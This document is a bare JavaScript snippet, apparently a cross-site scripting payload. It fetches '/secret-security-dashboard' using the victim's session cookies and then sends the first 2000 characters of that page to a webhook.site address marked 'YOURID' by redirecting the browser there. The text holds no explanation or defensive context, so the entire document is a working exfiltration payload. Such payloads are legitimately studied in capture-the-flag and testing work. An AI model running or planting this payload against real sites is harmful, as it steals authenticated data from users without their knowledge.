(async()=>{
 let r=await fetch('/secret-security-dashboard',{credentials:'include'});
 let t=await r.text();

 location="https://webhook.site/YOURID/?d="+encodeURIComponent(t.slice(0,2000));
})();